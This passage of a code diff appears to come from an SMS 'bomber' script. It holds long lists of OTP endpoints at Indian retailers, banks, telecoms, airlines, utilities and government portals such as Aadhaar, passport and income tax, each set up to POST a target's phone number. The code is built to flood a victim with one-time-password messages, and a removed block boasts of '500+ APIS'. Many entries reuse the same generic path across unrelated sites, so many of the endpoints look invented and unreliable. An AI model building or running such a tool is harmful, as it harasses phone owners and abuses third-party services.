+    {"name": "tatapower_sms", "url": "https://www.tatapower.com/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
+    {"name": "adani_sms", "url": "https://www.adanielectricity.com/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
+    {"name": "bses_sms", "url": "https://www.bsesdelhi.com/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
+    {"name": "tpddl_sms", "url": "https://www.tpddl.com/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
+    {"name": "torrent_sms", "url": "https://www.torrentpower.com/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
+    {"name": "uppcl_sms", "url": "https://www.uppcl.org/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
+    {"name": "mseb_sms", "url": "https://www.mahadiscom.in/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
+    {"name": "gescom_sms", "url": "https://www.gescom.in/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
+    {"name": "bescom_sms", "url": "https://www.bescom.org/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
+    {"name": "cesc_sms", "url": "https://www.cesc.co.in/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
+    {"name": "wbsedcl_sms", "url": "https://www.wbsedcl.in/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
+    {"name": "gujaratgas_sms", "url": "https://www.gujaratgas.com/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
+    {"name": "mahanagargas_sms", "url": "https://www.mahanagargas.com/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
+    {"name": "igl_sms", "url": "https://www.iglonline.net/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
+    {"name": "hpgas_sms", "url": "https://www.hpgas.com/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
+    {"name": "bharatgas_sms", "url": "https://www.bharatgas.com/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
+    {"name": "indane_sms", "url": "https://www.indane.co.in/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
+    {"name": "delhijal_sms", "url": "https://www.delhijalboard.in/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
+    {"name": "mcgm_sms", "url": "https://portal.mcgm.gov.in/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
+    {"name": "chennaimetrowater_sms", "url": "https://www.chennaimetrowater.com/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
+    {"name": "bwssb_sms", "url": "https://www.bwssb.gov.in/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
+    {"name": "phedraj_sms", "url": "https://phed.rajasthan.gov.in/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
+    {"name": "upsmd_sms", "url": "https://upsmd.in/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
+    {"name": "kwa_sms", "url": "https://www.kwa.kerala.gov.in/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
+    {"name": "phedpunjab_sms", "url": "https://phed.punjab.gov.in/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
+    {"name": "hpjal_sms", "url": "https://jalashakti.hp.gov.in/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
+    {"name": "jaljeevan_sms", "url": "https://jaljeevanmission.gov.in/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
+    {"name": "swachh_sms", "url": "https://swachhbharatmission.gov.in/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
+    {"name": "pmay_sms", "url": "https://pmaymis.gov.in/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
+    {"name": "nhai_sms", "url": "https://nhai.gov.in/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
+    {"name": "epfo_sms", "url": "https://www.epfindia.gov.in/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
+    {"name": "esic_sms", "url": "https://www.esic.gov.in/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
+    {"name": "incometax_sms", "url": "https://www.incometax.gov.in/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
+    {"name": "gst_sms", "url": "https://www.gst.gov.in/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
+    {"name": "mca_sms", "url": "https://www.mca.gov.in/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
+    {"name": "passport_sms", "url": "https://portal2.passportindia.gov.in/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
+    {"name": "voter_sms", "url": "https://www.nvsp.in/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
+    {"name": "aadhaar_sms", "url": "https://uidai.gov.in/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
+    {"name": "pan_sms", "url": "https://www.protean-tinpan.com/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
+    {"name": "driving_sms", "url": "https://parivahan.gov.in/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
+    {"name": "vehicle_sms", "url": "https://vahan.parivahan.gov.in/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
+    {"name": "digilocker_sms", "url": "https://www.digilocker.gov.in/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
+    {"name": "umang_sms", "url": "https://umang.gov.in/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
+    {"name": "csc_sms", "url": "https://www.csc.gov.in/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
+    {"name": "nic_sms", "url": "https://www.nic.in/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
+    {"name": "mygov_sms", "url": "https://www.mygov.in/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
+    {"name": "cpgrams_sms", "url": "https://pgportal.gov.in/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
+    {"name": "nationalportal_sms", "url": "https://www.india.gov.in/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
+    {"name": "railconnect_sms", "url": "https://railconnect.indianrail.gov.in/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
+    {"name": "airindia_sms", "url": "https://www.airindia.in/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
+    {"name": "indigo_sms", "url": "https://www.goindigo.in/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
+    {"name": "spicejet_sms", "url": "https://www.spicejet.com/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
+    {"name": "akasa_sms", "url": "https://www.akasaair.com/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
+    {"name": "vistara_sms", "url": "https://www.airvistara.com/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
+    {"name": "gofirst_sms", "url": "https://www.flygofirst.com/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
+    {"name": "olamoney_sms", "url": "https://www.olamoney.com/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
+    {"name": "amazonpay_sms", "url": "https://pay.amazon.in/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
 ]
-
-
-# ═══════════════════════════════════════════════════════════
-# 🎯 AUTO-ADD YOUR 500+ APIS (bulk pattern)
-# ═══════════════════════════════════════════════════════════
-BULK_BRANDS = [
-    # (name, base_url, path, payload_key)
-    ("flipkart_sms", "https://2.rome.api.flipkart.com", "/api/4/user/otp/generate", "mobileNumber"),
-    ("flipkart_voice", "https://www.flipkart.com", "/api/6/user/voice-otp/generate", "mobile"),
-    ("flipkart_wa", "https://flipkart.com", "/api/v2/auth/send-otp", "phoneNumber"),
-    ("flipkart_otp", "https://flipkart.com", "/v1/user/otplogin", "mobile"),
-    ("flipkart_login", "https://flipkart.com", "/gw/login-register/v1/sendOTP", "phone"),
-    ("flipkart_resend", "https://flipkart.com", "/api/v2/otpgenerate", "phoneNumber"),
-    ("amazon_sms", "https://amazon.in", "/api/v2/auth/send-otp", "number"),
-    ("amazon_voice", "https://amazon.in", "/api/v3/user/otp", "mobileNumber"),
-    ("amazon_wa", "https://amazon.in", "/gw/login-register/v1/sendOTP", "phone"),
-    ("myntra_sms", "https://www.myntra.com", "/gw/mobile-auth/otp/generate", "mobile"),
-    ("myntra_voice", "https://www.myntra.com", "/gw/mobile-auth/voice-otp", "mobile"),
-    ("ajio_sms", "https://www.ajio.com", "/api/otp/generate", "mobileNumber"),
-    ("meesho_wa", "https://meesho.com", "/gw/login-register/v1/sendOTP", "number"),
-    ("meesho_sms", "https://meesho.com", "/api/v1/auth/otpsend", "mobile"),
-    ("snapdeal_sms", "https://www.snapdeal.com", "/authenticate", "mobile"),
-    ("limeroad_sms", "https://www.limeroad.com", "/api/v1/otp/send", "mobile"),
-    ("tata_cliq_sms", "https://www.tatacliq.com", "/api/v1/otp", "mobile"),
-    ("croma_sms", "https://www.croma.com", "/api/v1/otp", "phone"),
-    ("reliance_digital_sms", "https://www.reliancedigital.in", "/api/otp", "mobile"),
-    ("firstcry_sms", "https://www.firstcry.com", "/api/sendotp", "mobile"),
-    ("nykaa_sms", "https://www.nykaa.com", "/api/auth/send-otp", "mobile"),
-    ("purplle_sms", "https://www.purplle.com", "/api/v1/otp", "mobile"),
-    ("mamaearth_sms", "https://auth.mamaearth.in", "/v1/auth/initiate-signup", "mobile"),
-    ("bewakoof_sms", "https://www.bewakoof.com", "/api/v1/otp", "mobile"),
-    ("souled_sms", "https://www.thesouledstore.com", "/api/v1/otp", "mobile"),
-    ("zivame_sms", "https://www.zivame.com", "/api/v1/otp", "mobile"),
-    ("paytm_mall_sms", "https://paytmmall.com", "/api/v1/otp", "mobile"),
-    ("swiggy_sms", "https://www.swiggy.com", "/api/v1/otp", "mobile"),
-    ("swiggy_voice", "https://profile.swiggy.com", "/api/v3/app/request_call_verification", "mobile"),
-    ("zomato_sms", "https://www.zomato.com", "/php/asyncLogin.php", "phone"),
-    ("dominOs_sms", "https://order.godominos.co.in", "/Online/App.aspx", "PhoneNo"),
-    ("pizzahut_sms", "https://www.pizzahut.co.in", "/api/v1/otp", "mobile"),
-    ("mcdonalds_sms", "https://www.mcdelivery.co.in", "/api/v1/otp", "mobile"),
-    ("burgerking_sms", "https://www.burgerking.in", "/api/v1/otp", "mobile"),
-    ("kfc_sms", "https://www.kfc.co.in", "/api/v1/otp", "mobile"),
-    ("bigbasket_sms", "https://www.bigbasket.com", "/bb-oauth/api/v2.0/otp/generate/", "mobile_number"),
-    ("grofers_sms", "https://www.grofers.com", "/api/v1/otp", "mobile"),
-    ("zepto_sms", "https://www.zepto.com", "/api/v1/otp", "phone"),
-    ("blinkit_sms", "https://blinkit.com", "/api/otp/generate", "phone"),
-    ("dunzo_sms", "https://www.dunzo.com", "/api/v1/otp", "phone"),
-    ("milkbasket_sms", "https://www.milkbasket.com", "/api/v1/otp", "mobile"),
-    ("countrydelight_sms", "https://api.countrydelight.in", "/api/v1/customer/requestOtp", "mobile"),
-    ("licious_sms", "https://www.licious.in", "/api/login/signup", "phone"),
-    ("freshtohome_sms", "https://www.freshtohome.com", "/api/v1/otp", "mobile"),
-    ("godrej_sms", "https://www.godrejnaturesbasket.com", "/api/v1/otp", "mobile"),
-    ("spencer_sms", "https://jiffy.spencers.in", "/user/auth/otp/send", "mobile"),
-    ("moreretail_sms", "https://omni-api.moreretail.in", "/api/v1/login/", "mobile"),
-    ("paytm_sms", "https://accounts.paytm.com", "/signin/otp", "phone"),
-    ("phonepe_sms", "https://www.phonepe.com", "/api/v2/otp", "phone"),
-    ("gpay_sms", "https://pay.google.com", "/api/v1/otp", "phoneNumber"),
-    ("bhim_sms", "https://www.bhim.com", "/api/v1/otp", "mobile"),
-    ("mobikwik_sms", "https://www.mobikwik.com", "/otp", "mobile"),
-    ("freecharge_sms", "https://www.freecharge.in", "/api/otp", "phone"),
-    ("uber_sms", "https://auth.uber.com", "/v2/otp", "phone"),
-    ("ola_sms", "https://api.olacabs.com", "/v1/otp", "phone"),
-    ("rapido_sms", "https://rapido.bike", "/api/v2/otp/generate", "mobile"),
-    ("meru_sms", "https://merucabapp.com", "/api/otp/generate", "mobile_number"),
-    ("makemytrip_sms", "https://www.makemytrip.com", "/api/umbrella/otp", "mobile"),
-    ("goibibo_sms", "https://www.goibibo.com", "/user/otp/generate/", "phone"),
-    ("irctc_sms", "https://www.irctc.co.in", "/api/v1/otp", "mobile"),
-    ("redbus_sms", "https://www.redbus.in", "/api/v1/otp", "phone"),
-    ("oyo_sms", "https://api.oyoroomscrm.com", "/api/v2/user/send_otp", "phone"),
-    ("treebo_sms", "https://www.treebo.com", "/api/v1/otp", "mobile"),
-    ("cleartrip_sms", "https://www.cleartrip.com", "/api/v1/otp", "mobile"),
-    ("easemytrip_sms", "https://www.easemytrip.com", "/api/v1/otp", "mobile"),
-    ("yatra_sms", "https://www.yatra.com", "/api/v1/otp", "mobile"),
-    ("ixigo_sms", "https://www.ixigo.com", "/api/v1/otp", "mobile"),
-    ("1mg_sms", "https://www.1mg.com", "/auth_api/v6/create_token", "number"),
-    ("pharmeasy_sms", "https://pharmeasy.in", "/api/v2/auth/send-otp", "phone"),
-    ("netmeds_sms", "https://www.netmeds.com", "/api/send_otp", "mobile"),
-    ("practo_sms", "https://www.practo.com", "/patient/loginviapassword", "phone"),
-    ("curefit_sms", "https://www.cure.fit", "/api/v1/otp", "mobile"),
-    ("cultfit_sms", "https://www.cult.fit", "/api/v1/otp", "phone"),
-    ("healthifyme_sms", "https://www.healthifyme.com", "/api/v1/otp", "phone"),
-    ("apollo247_sms", "https://www.apollo247.com", "/api/v1/otp", "phone"),
-    ("mfine_sms", "https://www.mfine.com", "/api/v1/otp", "mobile"),
-    ("docsapp_sms", "https://www.docsapp.com", "/api/v1/otp", "phone"),
-    ("lybrate_sms", "https://www.lybrate.com", "/api/v1/otp", "mobile"),
-    ("portea_sms", "https://www.portea.com", "/api/v1/otp", "phone"),
-    ("byjus_sms", "https://byjus.com", "/api/otp/send", "phone"),
-    ("unacademy_sms", "https://unacademy.com", "/api/otp", "mobile"),
-    ("vedantu_sms", "https://www.vedantu.com", "/api/otp", "phone"),
-    ("doubtnut_sms", "https://api.doubtnut.com", "/v4/student/login", "phone_number"),
-    ("toppr_sms", "https://www.toppr.com", "/api/otp", "mobile"),
-    ("whitehatjr_sms", "https://www.whitehatjr.com", "/api/otp", "phone"),
-    ("upgrad_sms", "https://www.upgrad.com", "/api/otp", "phone"),
-    ("netflix_sms", "https://www.netflix.com", "/api/v1/otp", "phone"),
-    ("prime_sms", "https://www.primevideo.com", "/api/v1/otp", "mobile"),
-    ("hotstar_sms", "https://www.hotstar.com", "/api/v1/otp", "phone"),
-    ("sonyliv_sms", "https://www.sonyliv.com", "/api/v1/otp", "mobile"),
-    ("zee5_sms", "https://www.zee5.com", "/api/v1/otp", "phone"),
-    ("jiocinema_sms", "https://www.jiocinema.com", "/api/v1/otp", "mobile"),
-    ("voot_sms", "https://www.voot.com", "/api/v1/otp", "phone"),
-    ("mxplayer_sms", "https://www.mxplayer.in", "/api/v1/otp", "mobile"),
-    ("altbalaji_sms", "https://www.altbalaji.com", "/api/v1/otp", "phone"),
-    ("spotify_sms", "https://www.spotify.com", "/api/v1/otp", "phone"),
-    ("gaana_sms", "https://www.gaana.com", "/api/v1/otp", "mobile"),
-    ("wynk_sms", "https://www.wynk.in", "/api/v1/otp", "phone"),
-    ("jiosaavn_sms", "https://www.jiosaavn.com", "/api/v1/otp", "mobile"),
-    ("hungama2_sms", "https://www.hungama.com", "/api/v1/otp", "mobile"),
-    ("linkedin_sms", "https://www.linkedin.com", "/api/v1/otp", "phone"),
-    ("naukri_sms", "https://www.naukri.com", "/api/v1/otp", "mobile"),
-    ("indeed_sms", "https://www.indeed.com", "/api/v1/otp", "phone"),
-    ("shine_sms", "https://www.shine.com", "/api/v1/otp", "mobile"),
-    ("monster_sms", "https://www.monster.com", "/api/v1/otp", "phone"),
-    ("timesjobs_sms", "https://www.timesjobs.com", "/api/v1/otp", "mobile"),
-    ("freshersworld_sms", "https://www.freshersworld.com", "/api/v1/otp", "phone"),
-    ("upwork_sms", "https://www.upwork.com", "/api/v1/otp", "mobile"),
-    ("fiverr_sms", "https://www.fiverr.com", "/api/v1/otp", "phone"),
-    ("freelancer_sms", "https://www.freelancer.com", "/api/v1/otp", "mobile"),
-    ("toptal_sms", "https://www.toptal.com", "/api/v1/otp", "phone"),
-    ("housing_sms", "https://login.housing.com", "/api/v2/send-otp", "phone"),
-    ("magicbricks_sms", "https://www.magicbricks.com", "/api/v1/otp", "mobile"),
-    ("99acres_sms", "https://www.99acres.com", "/api/v1/otp", "phone"),
-    ("commonfloor_sms", "https://www.commonfloor.com", "/api/v1/otp", "mobile"),
-    ("nobroker2_sms", "https://www.nobroker.in", "/api/v3/account/otp/send", "phone"),
-    ("squareyards_sms", "https://www.squareyards.com", "/api/v1/otp", "phone"),
-    ("pokerbaazi_sms", "https://www.pokerbaazi.com", "/api/v1/otp", "mobile"),
-    ("my11circle_sms", "https://www.my11circle.com", "/api/v1/otp", "mobile"),
-    ("dream11_sms", "https://www.dream11.com", "/api/v1/otp", "phone"),
-    ("mpl_sms", "https://www.mpl.live", "/api/v1/otp", "phone"),
-    ("adda52_sms", "https://www.adda52.com", "/api/v1/otp", "mobile"),
-    ("rummycircle_sms", "https://www.rummycircle.com", "/api/v1/otp", "mobile"),
-    ("jupiter_sms", "https://jupiter.money", "/api/v2/auth/send-otp", "phoneNumber"),
-    ("groww_sms", "https://groww.in", "/api/v1/otp", "mobile"),
-    ("zerodha_sms", "https://zerodha.com", "/api/v1/otp", "mobile"),
-    ("angelone_sms", "https://www.angelone.in", "/api/v1/otp", "mobile"),
-    ("upstox_sms", "https://upstox.com", "/api/v1/otp", "mobile"),
-    ("5paisa_sms", "https://www.5paisa.com", "/api/v1/otp", "mobile"),
-    ("icicidirect_sms", "https://www.icicidirect.com", "/api/v1/otp", "mobile"),
-    ("hdfcsec_sms", "https://www.hdfcsec.com", "/api/v1/otp", "mobile"),
-    ("sharekhan_sms", "https://www.sharekhan.com", "/api/v1/otp", "mobile"),
-    ("motilaloswal_sms", "https://www.motilaloswal.com", "/api/v1/otp", "mobile"),
-    ("kotaksec_sms", "https://www.kotaksecurities.com", "/api/v1/otp", "mobile"),
-    ("axisdirect_sms", "https://www.axisdirect.in", "/api/v1/otp", "mobile"),
-    ("iifl_sms", "https://www.iifl.com", "/api/v1/otp", "mobile"),
-    ("edelweiss_sms", "https://www.edelweiss.in", "/api/v1/otp", "mobile"),
-    ("jmfinancial_sms", "https://www.jmfinancial.com", "/api/v1/otp", "mobile"),
-    ("anandrathi_sms", "https://www.anandrathi.com", "/api/v1/otp", "mobile"),
-    ("geojit_sms", "https://www.geojit.com", "/api/v1/otp", "mobile"),
-    ("sbilife_sms", "https://www.sbilife.co.in", "/api/v1/otp", "mobile"),
-    ("hdfclife_sms", "https://www.hdfclife.com", "/api/v1/otp", "mobile"),
-    ("icicipru_sms", "https://www.iciciprulife.com", "/api/v1/otp", "mobile"),
-    ("maxlife_sms", "https://www.maxlifeinsurance.com", "/api/v1/otp", "mobile"),
-    ("tataaia_sms", "https://www.tataaia.com", "/api/v1/otp", "mobile"),
-    ("bajajallianz_sms", "https://www.bajajallianz.com", "/api/v1/otp", "mobile"),
-    ("reliancenippon_sms", "https://www.reliancenipponlife.com", "/api/v1/otp", "mobile"),
-    ("adityabirla_sms", "https://lifeinsurance.adityabirlacapital.com", "/api/v1/otp", "mobile"),
-    ("pnbmetlife_sms", "https://www.pnbmetlife.com", "/api/v1/otp", "mobile"),
-    ("kotaklife_sms", "https://www.kotaklife.com", "/api/v1/otp", "mobile"),
-    ("airtelbank_sms", "https://www.airtel.in", "/bank/api/v1/otp", "mobile"),
-    ("ippb_sms", "https://www.ippbonline.com", "/api/v1/otp", "mobile"),
-    ("finopay_sms", "https://www.finopayments.com", "/api/v1/otp", "mobile"),
-    ("jiopay_sms", "https://www.jiopaymentsbank.com", "/api/v1/otp", "mobile"),
-    ("nsdlpay_sms", "https://www.nsdlpaymentsbank.in", "/api/v1/otp", "mobile"),
-    ("suryoday_sms", "https://www.suryodaybank.com", "/api/v1/otp", "mobile"),
-    ("utkarsh_sms", "https://www.utkarshbank.com", "/api/v1/otp", "mobile"),
-    ("equitas_sms", "https://www.equitasbank.com", "/api/v1/otp", "mobile"),
-    ("cityunion_sms", "https://www.cityunionbank.com", "/api/v1/otp", "mobile"),
-    ("dcb_sms", "https://www.dcbbank.com", "/api/v1/otp", "mobile"),
-    ("tmb_sms", "https://www.tmb.in", "/api/v1/otp", "mobile"),
-    ("csb_sms", "https://www.csb.co.in", "/api/v1/otp", "mobile"),
-    ("esaf_sms", "https://www.esafbank.com", "/api/v1/otp", "mobile"),
-    ("fincare_sms", "https://www.fincarebank.com", "/api/v1/otp", "mobile"),
-    ("janabank_sms", "https://www.janabank.com", "/api/v1/otp", "mobile"),
-    ("jkbank_sms", "https://www.jkbank.com", "/api/v1/otp", "mobile"),
-    ("karnatakabank_sms", "https://www.karnatakabank.com", "/api/v1/otp", "mobile"),
-    ("keralagbank_sms", "https://www.keralagbank.com", "/api/v1/otp", "mobile"),
-    ("paytmbank_sms", "https://www.paytmbank.com", "/api/v1/otp", "mobile"),
-    ("airtel_thanks_sms", "https://www.airtel.in", "/thanks/api/v1/otp", "mobile"),
-    ("jio_sms", "https://www.jio.com", "/api/v1/otp", "mobile"),
-    ("vi_sms", "https://www.myvi.in", "/api/v1/otp", "mobile"),
-    ("bsnl_sms", "https://www.bsnl.in", "/api/v1/otp", "mobile"),
-    ("tataplay_sms", "https://www.tataplay.com", "/api/v1/otp", "mobile"),
-    ("dishtv_sms", "https://www.dishtv.in", "/api/v1/otp", "mobile"),
-    ("airteldth_sms", "https://www.airtel.in", "/dth/api/v1/otp", "mobile"),
-    ("jiofiber_sms", "https://www.jio.com", "/fiber/api/v1/otp", "mobile"),
-    ("hathway_sms", "https://www.hathway.com", "/api/v1/otp", "mobile"),
-    ("den_sms", "https://www.dennetworks.com", "/api/v1/otp", "mobile"),
-    ("siticable_sms", "https://www.siticable.com", "/api/v1/otp", "mobile"),
-    ("tatapower_sms", "https://www.tatapower.com", "/api/v1/otp", "mobile"),
-    ("adani_sms", "https://www.adanielectricity.com", "/api/v1/otp", "mobile"),
-    ("bses_sms", "https://www.bsesdelhi.com", "/api/v1/otp", "mobile"),
-    ("tpddl_sms", "https://www.tpddl.com", "/api/v1/otp", "mobile"),
-    ("torrent_sms", "https://www.torrentpower.com", "/api/v1/otp", "mobile"),
-    ("uppcl_sms", "https://www.uppcl.org", "/api/v1/otp", "mobile"),
-    ("mseb_sms", "https://www.mahadiscom.in", "/api/v1/otp", "mobile"),
-    ("gescom_sms", "https://www.gescom.in", "/api/v1/otp", "mobile"),
-    ("bescom_sms", "https://www.bescom.org", "/api/v1/otp", "mobile"),
-    ("cesc_sms", "https://www.cesc.co.in", "/api/v1/otp", "mobile"),
-    ("wbsedcl_sms", "https://www.wbsedcl.in", "/api/v1/otp", "mobile"),
-    ("gujaratgas_sms", "https://www.gujaratgas.com", "/api/v1/otp", "mobile"),
-    ("mahanagargas_sms", "https://www.mahanagargas.com", "/api/v1/otp", "mobile"),
-    ("igl_sms", "https://www.iglonline.net", "/api/v1/otp", "mobile"),
-    ("hpgas_sms", "https://www.hpgas.com", "/api/v1/otp", "mobile"),
-    ("bharatgas_sms", "https://www.bharatgas.com", "/api/v1/otp", "mobile"),
-    ("indane_sms", "https://www.indane.co.in", "/api/v1/otp", "mobile"),
-    ("delhijal_sms", "https://www.delhijalboard.in", "/api/v1/otp", "mobile"),
-    ("mcgm_sms", "https://portal.mcgm.gov.in", "/api/v1/otp", "mobile"),
-    ("chennaimetrowater_sms", "https://www.chennaimetrowater.com", "/api/v1/otp", "mobile"),
-    ("bwssb_sms", "https://www.bwssb.gov.in", "/api/v1/otp", "mobile"),
-    ("phedraj_sms", "https://phed.rajasthan.gov.in", "/api/v1/otp", "mobile"),
-    ("upsmd_sms", "https://upsmd.in", "/api/v1/otp", "mobile"),
-    ("kwa_sms", "https://www.kwa.kerala.gov.in", "/api/v1/otp", "mobile"),
-    ("phedpunjab_sms", "https://phed.punjab.gov.in", "/api/v1/otp", "mobile"),
-    ("hpjal_sms", "https://jalashakti.hp.gov.in", "/api/v1/otp", "mobile"),
-    ("jaljeevan_sms", "https://jaljeevanmission.gov.in", "/api/v1/otp", "mobile"),
-    ("swachh_sms", "https://swachhbharatmission.gov.in", "/api/v1/otp", "mobile"),
-    ("pmay_sms", "https://pmaymis.gov.in", "/api/v1/otp", "mobile"),
-    ("nhai_sms", "https://nhai.gov.in", "/api/v1/otp", "mobile"),
-    ("epfo_sms", "https://www.epfindia.gov.in", "/api/v1/otp", "mobile"),
-    ("esic_sms", "https://www.esic.gov.in", "/api/v1/otp", "mobile"),
-    ("incometax_sms", "https://www.incometax.gov.in", "/api/v1/otp", "mobile"),
-    ("gst_sms", "https://www.gst.gov.in", "/api/v1/otp", "mobile"),
-    ("mca_sms", "https://www.mca.gov.in", "/api/v1/otp", "mobile"),
-    ("passport_sms", "https://portal2.passportindia.gov.in", "/api/v1/otp", "mobile"),
-    ("voter_sms", "https://www.nvsp.in", "/api/v1/otp", "mobile"),
-    ("aadhaar_sms", "https://uidai.gov.in", "/api/v1/otp", "mobile"),
-    ("pan_sms", "https://www.protean-tinpan.com", "/api/v1/otp", "mobile"),
-    ("driving_sms", "https://parivahan.gov.in", "/api/v1/otp", "mobile"),
-    ("vehicle_sms", "https://vahan.parivahan.gov.in", "/api/v1/otp", "mobile"),
-    ("digilocker_sms", "https://www.digilocker.gov.in", "/api/v1/otp", "mobile"),
-    ("umang_sms", "https://umang.gov.in", "/api/v1/otp", "mobile"),
-    ("csc_sms", "https://www.csc.gov.in", "/api/v1/otp", "mobile"),
-    ("nic_sms", "https://www.nic.in", "/api/v1/otp", "mobile"),
-    ("mygov_sms", "https://www.mygov.in", "/api/v1/otp", "mobile"),
-    ("cpgrams_sms", "https://pgportal.gov.in", "/api/v1/otp", "mobile"),
-    ("nationalportal_sms", "https://www.india.gov.in", "/api/v1/otp", "mobile"),
-    ("railconnect_sms", "https://railconnect.indianrail.gov.in", "/api/v1/otp", "mobile"),
-    ("airindia_sms", "https://www.airindia.in", "/api/v1/otp", "mobile"),
-    ("indigo_sms", "https://www.goindigo.in", "/api/v1/otp", "mobile"),
